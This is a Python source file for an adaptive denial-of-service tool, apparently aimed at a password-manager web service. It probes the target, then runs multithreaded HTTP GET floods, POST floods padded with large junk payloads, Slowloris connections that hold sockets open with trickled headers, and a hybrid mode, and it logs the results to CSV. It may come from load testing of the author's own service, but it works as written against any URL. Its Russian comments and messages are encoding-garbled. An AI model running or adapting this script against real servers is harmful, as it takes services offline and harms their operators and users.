import requests
import threading
import time
import random
import json
import socket
from colorama import Fore, Style, init
from utils.metrics import metrics_collector
from utils.test_data import test_data_generator

# –ò–Ω–∏—Ü–∏–∞–ª–∏–∑–∞—Ü–∏—è colorama –¥–ª—è —Ü–≤–µ—Ç–Ω–æ–≥–æ –≤—ã–≤–æ–¥–∞
init(autoreset=True)

class SmartAttack:
    """–£–º–Ω–∞—è –∞–¥–∞–ø—Ç–∏–≤–Ω–∞—è –∞—Ç–∞–∫–∞, –∫–æ–º–±–∏–Ω–∏—Ä—É—é—â–∞—è —Ä–∞–∑–ª–∏—á–Ω—ã–µ —Å—Ç—Ä–∞—Ç–µ–≥–∏–∏"""
    
    def __init__(self, target_url: str, threads: int = 15, duration: int = 300):
        self.target_url = target_url
        self.threads = threads
        self.duration = duration
        self.running = False
        
        # –ò–∑–≤–ª–µ–∫–∞–µ–º —Ö–æ—Å—Ç –∏ –ø–æ—Ä—Ç
        if "://" in target_url:
            self.host = target_url.split("://")[1].split(":")[0]
            self.port = int(target_url.split(":")[-1]) if ":" in target_url.split("://")[1] else 80
        else:
            self.host = target_url.split(":")[0]
            self.port = int(target_url.split(":")[1]) if ":" in target_url else 80
        
        # –°—Ç–∞—Ç–∏—Å—Ç–∏–∫–∞ –∞—Ç–∞–∫
        self.stats = {
            "http_flood": {"requests": 0, "success": 0, "avg_response": 0},
            "post_flood": {"requests": 0, "success": 0, "avg_response": 0},
            "slowloris": {"connections": 0, "success": 0, "duration": 0},
            "hybrid": {"requests": 0, "success": 0, "avg_response": 0}
        }
        
        # –î–æ—Å—Ç—É–ø–Ω—ã–µ —ç–Ω–¥–ø–æ–∏–Ω—Ç—ã
        self.endpoints = {
            "get": ["/auth/health", "/api/passwords", "/api/notes", "/api/backup/export"],
            "post": ["/auth/register", "/auth/login", "/auth/sync-setup", "/auth/verify-otp", 
                    "/auth/cloud-login", "/api/passwords", "/api/notes", "/api/backup/import"]
        }
        
        # –ê–¥–∞–ø—Ç–∏–≤–Ω—ã–µ –ø–∞—Ä–∞–º–µ—Ç—Ä—ã
        self.success_rate = 0.0
        self.avg_response_time = 0.0
        self.strategy_weights = {
            "http_flood": 0.25,
            "post_flood": 0.25,
            "slowloris": 0.25,
            "hybrid": 0.25
        }
    
    def analyze_target(self):
        """–ê–Ω–∞–ª–∏–∑–∏—Ä—É–µ—Ç —Ü–µ–ª—å –¥–ª—è –≤—ã–±–æ—Ä–∞ –æ–ø—Ç–∏–º–∞–ª—å–Ω–æ–π —Å—Ç—Ä–∞—Ç–µ–≥–∏–∏"""
        print(f"{Fore.CYAN}üîç –ê–Ω–∞–ª–∏–∑ —Ü–µ–ª–∏ {self.target_url}...")
        
        try:
            # –¢–µ—Å—Ç–æ–≤—ã–π –∑–∞–ø—Ä–æ—Å –¥–ª—è –æ–ø—Ä–µ–¥–µ–ª–µ–Ω–∏—è —Ö–∞—Ä–∞–∫—Ç–µ—Ä–∏—Å—Ç–∏–∫ —Å–µ—Ä–≤–µ—Ä–∞
            start_time = time.time()
            response = requests.get(f"{self.target_url}/auth/health", timeout=5)
            response_time = time.time() - start_time
            
            print(f"{Fore.GREEN}‚úÖ –°–µ—Ä–≤–µ—Ä –æ—Ç–≤–µ—á–∞–µ—Ç (HTTP {response.status_code}) –∑–∞ {response_time:.3f}—Å")
            
            # –ê–Ω–∞–ª–∏–∑–∏—Ä—É–µ–º –∑–∞–≥–æ–ª–æ–≤–∫–∏ –æ—Ç–≤–µ—Ç–∞
            server_header = response.headers.get('Server', 'Unknown')
            connection_header = response.headers.get('Connection', 'Unknown')
            
            print(f"{Fore.YELLOW}üìã –°–µ—Ä–≤–µ—Ä: {server_header}")
            print(f"{Fore.YELLOW}üìã –°–æ–µ–¥–∏–Ω–µ–Ω–∏–µ: {connection_header}")
            
            # –ê–¥–∞–ø—Ç–∏—Ä—É–µ–º –≤–µ—Å–∞ —Å—Ç—Ä–∞—Ç–µ–≥–∏–π –Ω–∞ –æ—Å–Ω–æ–≤–µ –∞–Ω–∞–ª–∏–∑–∞
            if response_time > 1.0:
                # –ú–µ–¥–ª–µ–Ω–Ω—ã–π —Å–µ—Ä–≤–µ—Ä - –±–æ–ª—å—à–µ slowloris
                self.strategy_weights["slowloris"] = 0.4
                self.strategy_weights["post_flood"] = 0.3
                print(f"{Fore.YELLOW}‚ö° –û–±–Ω–∞—Ä—É–∂–µ–Ω –º–µ–¥–ª–µ–Ω–Ω—ã–π —Å–µ—Ä–≤–µ—Ä - –ø—Ä–∏–æ—Ä–∏—Ç–µ—Ç Slowloris")
            elif response_time < 0.1:
                # –ë—ã—Å—Ç—Ä—ã–π —Å–µ—Ä–≤–µ—Ä - –±–æ–ª—å—à–µ flood –∞—Ç–∞–∫
                self.strategy_weights["http_flood"] = 0.35
                self.strategy_weights["post_flood"] = 0.35
                print(f"{Fore.YELLOW}‚ö° –û–±–Ω–∞—Ä—É–∂–µ–Ω –±—ã—Å—Ç—Ä—ã–π —Å–µ—Ä–≤–µ—Ä - –ø—Ä–∏–æ—Ä–∏—Ç–µ—Ç Flood –∞—Ç–∞–∫–∞–º")
            
            return True
            
        except Exception as e:
            print(f"{Fore.RED}‚ùå –û—à–∏–±–∫–∞ –∞–Ω–∞–ª–∏–∑–∞ —Ü–µ–ª–∏: {str(e)}")
            return False
    
    def adaptive_http_flood(self, thread_id: int, requests_count: int):
        """–ê–¥–∞–ø—Ç–∏–≤–Ω–∞—è HTTP flood –∞—Ç–∞–∫–∞"""
        success_count = 0
        total_response_time = 0
        
        for i in range(requests_count):
            if not self.running:
                break
                
            try:
                endpoint = random.choice(self.endpoints["get"])
                url = self.target_url + endpoint
                
                headers = test_data_generator.get_random_headers()
                
                # –ê–¥–∞–ø—Ç–∏–≤–Ω—ã–µ –ø–∞—Ä–∞–º–µ—Ç—Ä—ã –∑–∞–ø—Ä–æ—Å–∞
                params = {}
                if random.random() < 0.3:  # 30% —à–∞–Ω—Å –¥–æ–±–∞–≤–∏—Ç—å –ø–∞—Ä–∞–º–µ—Ç—Ä—ã
                    params = {
                        "page": random.randint(1, 100),
                        "size": random.randint(1, 1000),
                        "search": "x" * random.randint(10, 100)
                    }
                
                start_time = time.time()
                response = requests.get(url, headers=headers, params=params, timeout=5)
                response_time = time.time() - start_time
                
                metrics_collector.add_metric(
                    response_time=response_time,
                    status_code=response.status_code,
                    size=len(response.content),
                    attack_type="SMART_HTTP",
                    endpoint=endpoint
                )
                
                self.stats["http_flood"]["requests"] += 1
                total_response_time += response_time
                
                if response.status_code < 400:
                    success_count += 1
                    self.stats["http_flood"]["success"] += 1
                    print(f"{Fore.GREEN}üåä [{thread_id}] HTTP: {response.status_code} {endpoint} ({response_time:.3f}s)")
                else:
                    print(f"{Fore.RED}üåä [{thread_id}] HTTP: {response.status_code} {endpoint}")
                
                time.sleep(random.uniform(0.01, 0.1))
                
            except Exception as e:
                metrics_collector.add_metric(0, 0, 0, "SMART_HTTP", endpoint, str(e))
                print(f"{Fore.RED}üí• [{thread_id}] HTTP Error: {str(e)}")
        
        if self.stats["http_flood"]["requests"] > 0:
            self.stats["http_flood"]["avg_response"] = total_response_time / self.stats["http_flood"]["requests"]
    
    def adaptive_post_flood(self, thread_id: int, requests_count: int):
        """–ê–¥–∞–ø—Ç–∏–≤–Ω–∞—è POST flood –∞—Ç–∞–∫–∞"""
        success_count = 0
        total_response_time = 0
        
        for i in range(requests_count):
            if not self.running:
                break
                
            try:
                endpoint = random.choice(self.endpoints["post"])
                url = self.target_url + endpoint
                
                headers = test_data_generator.get_random_headers()
                headers["Content-Type"] = "application/json"
                
                # –ü–æ–ª—É—á–∞–µ–º –ø–æ–¥—Ö–æ–¥—è—â–∏–µ –¥–∞–Ω–Ω—ã–µ –¥–ª—è —ç–Ω–¥–ø–æ–∏–Ω—Ç–∞
                post_data = test_data_generator.get_random_endpoint_data(endpoint)
                
                # –ê–¥–∞–ø—Ç–∏–≤–Ω–æ–µ —É–≤–µ–ª–∏—á–µ–Ω–∏–µ —Ä–∞–∑–º–µ—Ä–∞ –¥–∞–Ω–Ω—ã—Ö
                if random.random() < 0.4:  # 40% —à–∞–Ω—Å –¥–æ–±–∞–≤–∏—Ç—å –±–æ–ª—å—à–∏–µ –¥–∞–Ω–Ω—ã–µ
                    post_data["bulkData"] = "x" * random.randint(1000, 10000)
                    post_data["arrays"] = [f"item_{j}" for j in range(random.randint(10, 100))]
                
                start_time = time.time()
                response = requests.post(url, headers=headers, json=post_data, timeout=10)
                response_time = time.time() - start_time
                
                metrics_collector.add_metric(
                    response_time=response_time,
                    status_code=response.status_code,
                    size=len(response.content),
                    attack_type="SMART_POST",
                    endpoint=endpoint
                )
                
                self.stats["post_flood"]["requests"] += 1
                total_response_time += response_time
                
                if response.status_code < 400:
                    success_count += 1
                    self.stats["post_flood"]["success"] += 1
                    print(f"{Fore.MAGENTA}üìÆ [{thread_id}] POST: {response.status_code} {endpoint} ({response_time:.3f}s)")
                else:
                    print(f"{Fore.RED}üìÆ [{thread_id}] POST: {response.status_code} {endpoint}")
                
                time.sleep(random.uniform(0.05, 0.2))
                
            except Exception as e:
                metrics_collector.add_metric(0, 0, 0, "SMART_POST", endpoint, str(e))
                print(f"{Fore.RED}üí• [{thread_id}] POST Error: {str(e)}")
        
        if self.stats["post_flood"]["requests"] > 0:
            self.stats["post_flood"]["avg_response"] = total_response_time / self.stats["post_flood"]["requests"]
    
    def adaptive_slowloris(self, thread_id: int, connections_count: int):
        """–ê–¥–∞–ø—Ç–∏–≤–Ω–∞—è Slowloris –∞—Ç–∞–∫–∞"""
        sockets = []
        successful_connections = 0
        
        # –£—Å—Ç–∞–Ω–∞–≤–ª–∏–≤–∞–µ–º —Å–æ–µ–¥–∏–Ω–µ–Ω–∏—è
        for i in range(connections_count):
            if not self.running:
                break
                
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(3)
                sock.connect((self.host, self.port))
                
                # –û—Ç–ø—Ä–∞–≤–ª—è–µ–º –Ω–∞—á–∞–ª—å–Ω—ã–π HTTP –∑–∞–ø—Ä–æ—Å
                endpoint = random.choice(self.endpoints["get"])
                initial_request = f"GET {endpoint} HTTP/1.1\r\nHost: {self.host}:{self.port}\r\n"
                sock.send(initial_request.encode('utf-8'))
                
                sockets.append(sock)
                successful_connections += 1
                
                print(f"{Fore.RED}üêå [{thread_id}] Slowloris —Å–æ–µ–¥–∏–Ω–µ–Ω–∏–µ {i+1} —É—Å—Ç–∞–Ω–æ–≤–ª–µ–Ω–æ")
                time.sleep(random.uniform(0.1, 0.3))
                
            except Exception as e:
                print(f"{Fore.RED}‚ùå [{thread_id}] Slowloris connection failed: {str(e)}")
        
        self.stats["slowloris"]["connections"] += successful_connections
        
        # –ü–æ–¥–¥–µ—Ä–∂–∏–≤–∞–µ–º —Å–æ–µ–¥–∏–Ω–µ–Ω–∏—è
        start_time = time.time()
        headers_to_send = [
            "User-Agent: Mozilla/5.0 (Smart Attack Bot)",
            "Accept: text/html,application/xhtml+xml",
            "Accept-Language: en-us,en;q=0.5",
            "Accept-Encoding: gzip,deflate",
            "Connection: keep-alive"
        ]
        
        while self.running and (time.time() - start_time) < 60:  # 60 —Å–µ–∫—É–Ω–¥ —É–¥–µ—Ä–∂–∞–Ω–∏—è
            for i, sock in enumerate(sockets[:]):
                if not self.running:
                    break
                    
                try:
                    header = random.choice(headers_to_send)
                    sock.send(f"{header}\r\n".encode('utf-8'))
                    
                    metrics_collector.add_metric(
                        response_time=time.time() - start_time,
                        status_code=200,
                        size=len(header),
                        attack_type="SMART_SLOWLORIS",
                        endpoint="slow_connection"
                    )
                    
                    print(f"{Fore.RED}üêå [{thread_id}] Slowloris header sent to connection {i}")
                    
                except Exception as e:
                    sockets.remove(sock)
                    print(f"{Fore.RED}üêå [{thread_id}] Slowloris connection {i} lost")
            
            time.sleep(random.uniform(5, 15))
        
        # –ó–∞–∫—Ä—ã–≤–∞–µ–º —Å–æ–µ–¥–∏–Ω–µ–Ω–∏—è
        for sock in sockets:
            try:
                sock.close()
            except:
                pass
        
        duration = time.time() - start_time
        self.stats["slowloris"]["duration"] += duration
        if successful_connections > 0:
            self.stats["slowloris"]["success"] += 1
    
    def hybrid_attack(self, thread_id: int, requests_count: int):
        """–ì–∏–±—Ä–∏–¥–Ω–∞—è –∞—Ç–∞–∫–∞, —Å–º–µ—à–∏–≤–∞—é—â–∞—è GET –∏ POST –∑–∞–ø—Ä–æ—Å—ã"""
        for i in range(requests_count):
            if not self.running:
                break
                
            # –°–ª—É—á–∞–π–Ω–æ –≤—ã–±–∏—Ä–∞–µ–º –º–µ–∂–¥—É GET –∏ POST
            if random.choice([True, False]):
                self.adaptive_http_flood(thread_id, 1)
            else:
                self.adaptive_post_flood(thread_id, 1)
            
            self.stats["hybrid"]["requests"] += 1
            
            # –ê–¥–∞–ø—Ç–∏–≤–Ω–∞—è –ø–∞—É–∑–∞
            time.sleep(random.uniform(0.01, 0.5))
    
    def attack_thread(self, thread_id: int):
        """–û—Å–Ω–æ–≤–Ω–æ–π –ø–æ—Ç–æ–∫ –∞—Ç–∞–∫–∏ —Å –∞–¥–∞–ø—Ç–∏–≤–Ω—ã–º –≤—ã–±–æ—Ä–æ–º —Å—Ç—Ä–∞—Ç–µ–≥–∏–∏"""
        print(f"{Fore.YELLOW}üöÄ –£–º–Ω—ã–π –ø–æ—Ç–æ–∫ {thread_id} –∑–∞–ø—É—â–µ–Ω")
        
        start_time = time.time()
        
        while self.running and (time.time() - start_time) < self.duration:
            # –í—ã–±–∏—Ä–∞–µ–º —Å—Ç—Ä–∞—Ç–µ–≥–∏—é –Ω–∞ –æ—Å–Ω–æ–≤–µ –≤–µ—Å–æ–≤
            strategy = random.choices(
                list(self.strategy_weights.keys()),
                weights=list(self.strategy_weights.values())
            )[0]
            
            if strategy == "http_flood":
                self.adaptive_http_flood(thread_id, random.randint(5, 15))
            elif strategy == "post_flood":
                self.adaptive_post_flood(thread_id, random.randint(3, 10))
            elif strategy == "slowloris":
                self.adaptive_slowloris(thread_id, random.randint(2, 5))
            elif strategy == "hybrid":
                self.hybrid_attack(thread_id, random.randint(5, 15))
            
            # –ê–¥–∞–ø—Ç–∏–≤–Ω–∞—è –ø–∞—É–∑–∞ –º–µ–∂–¥—É —Å—Ç—Ä–∞—Ç–µ–≥–∏—è–º–∏
            time.sleep(random.uniform(1, 5))
        
        print(f"{Fore.BLUE}üèÅ –£–º–Ω—ã–π –ø–æ—Ç–æ–∫ {thread_id} –∑–∞–≤–µ—Ä—à–µ–Ω")
    
    def run(self):
        """–ó–∞–ø—É—Å–∫ —É–º–Ω–æ–π –∞—Ç–∞–∫–∏"""
        print(f"\n{Fore.LIGHTMAGENTA_EX}{'='*60}")
        print(f"{Fore.LIGHTMAGENTA_EX}üß† –ó–ê–ü–£–°–ö –£–ú–ù–û–ô –ê–î–ê–ü–¢–ò–í–ù–û–ô –ê–¢–ê–ö–ò")
        print(f"{Fore.LIGHTMAGENTA_EX}{'='*60}")
        print(f"{Fore.WHITE}–¶–µ–ª—å: {self.target_url}")
        print(f"{Fore.WHITE}–ü–æ—Ç–æ–∫–æ–≤: {self.threads}")
        print(f"{Fore.WHITE}–ü—Ä–æ–¥–æ–ª–∂–∏—Ç–µ–ª—å–Ω–æ—Å—Ç—å: {self.duration} —Å–µ–∫—É–Ω–¥")
        print(f"{Fore.WHITE}–°—Ç—Ä–∞—Ç–µ–≥–∏–∏: HTTP Flood, POST Flood, Slowloris, Hybrid")
        print(f"{Fore.LIGHTMAGENTA_EX}{'='*60}")
        
        # –ê–Ω–∞–ª–∏–∑–∏—Ä—É–µ–º —Ü–µ–ª—å
        if not self.analyze_target():
            print(f"{Fore.RED}‚ùå –ù–µ —É–¥–∞–ª–æ—Å—å –ø—Ä–æ–∞–Ω–∞–ª–∏–∑–∏—Ä–æ–≤–∞—Ç—å —Ü–µ–ª—å")
            return None
        
        print(f"\n{Fore.CYAN}üéØ –í–µ—Å–∞ —Å—Ç—Ä–∞—Ç–µ–≥–∏–π:")
        for strategy, weight in self.strategy_weights.items():
            print(f"{Fore.CYAN}  {strategy}: {weight:.2f}")
        
        # –û—á–∏—â–∞–µ–º –ø—Ä–µ–¥—ã–¥—É—â–∏–µ –º–µ—Ç—Ä–∏–∫–∏
        metrics_collector.clear()
        
        self.running = True
        
        # –ó–∞–ø—É—Å–∫–∞–µ–º –ø–æ—Ç–æ–∫–∏
        threads = []
        start_time = time.time()
        
        for i in range(self.threads):
            thread = threading.Thread(target=self.attack_thread, args=(i+1,))
            thread.daemon = True
            thread.start()
            threads.append(thread)
        
        try:
            # –ñ–¥–µ–º –∑–∞–≤–µ—Ä—à–µ–Ω–∏—è –≤—Ä–µ–º–µ–Ω–∏ –∞—Ç–∞–∫–∏
            time.sleep(self.duration)
        except KeyboardInterrupt:
            print(f"\n{Fore.YELLOW}‚èπÔ∏è  –ê—Ç–∞–∫–∞ –ø—Ä–µ—Ä–≤–∞–Ω–∞ –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª–µ–º")
        finally:
            self.running = False
        
        # –ñ–¥–µ–º –∑–∞–≤–µ—Ä—à–µ–Ω–∏—è –ø–æ—Ç–æ–∫–æ–≤
        for thread in threads:
            thread.join(timeout=10)
        
        end_time = time.time()
        duration = end_time - start_time
        
        # –í—ã–≤–æ–¥–∏–º –∏—Ç–æ–≥–æ–≤—É—é —Å—Ç–∞—Ç–∏—Å—Ç–∏–∫—É
        print(f"\n{Fore.LIGHTMAGENTA_EX}{'='*60}")
        print(f"{Fore.LIGHTMAGENTA_EX}üìä –†–ï–ó–£–õ–¨–¢–ê–¢–´ –£–ú–ù–û–ô –ê–¢–ê–ö–ò")
        print(f"{Fore.LIGHTMAGENTA_EX}{'='*60}")
        print(f"{Fore.WHITE}–í—Ä–µ–º—è –≤—ã–ø–æ–ª–Ω–µ–Ω–∏—è: {duration:.2f} —Å–µ–∫—É–Ω–¥")
        
        for strategy, stats in self.stats.items():
            if stats["requests"] > 0 or stats.get("connections", 0) > 0:
                print(f"\n{Fore.CYAN}üìà {strategy.upper()}:")
                if "requests" in stats and stats["requests"] > 0:
                    print(f"  –ó–∞–ø—Ä–æ—Å–æ–≤: {stats['requests']}")
                    print(f"  –£—Å–ø–µ—à–Ω—ã—Ö: {stats['success']}")
                    print(f"  –°—Ä–µ–¥–Ω–µ–µ –≤—Ä–µ–º—è: {stats['avg_response']:.3f}—Å")
                if "connections" in stats and stats["connections"] > 0:
                    print(f"  –°–æ–µ–¥–∏–Ω–µ–Ω–∏–π: {stats['connections']}")
                    print(f"  –í—Ä–µ–º—è —É–¥–µ—Ä–∂–∞–Ω–∏—è: {stats['duration']:.2f}—Å")
        
        print(f"{Fore.LIGHTMAGENTA_EX}{'='*60}")
        
        # –°–æ—Ö—Ä–∞–Ω—è–µ–º –º–µ—Ç—Ä–∏–∫–∏
        timestamp = int(time.time())
        csv_filename = f"metrics/smart_attack_{timestamp}.csv"
        metrics_collector.save_to_csv(csv_filename)
        metrics_collector.print_stats()
        
        return csv_filename


def run(target_url: str, threads: int = 15, duration: int = 300):
    """–§—É–Ω–∫—Ü–∏—è –¥–ª—è –∑–∞–ø—É—Å–∫–∞ —É–º–Ω–æ–π –∞—Ç–∞–∫–∏ (—Å–æ–≤–º–µ—Å—Ç–∏–º–æ—Å—Ç—å —Å –º–µ–Ω—é)"""
    attack = SmartAttack(target_url, threads, duration)
    return attack.run() 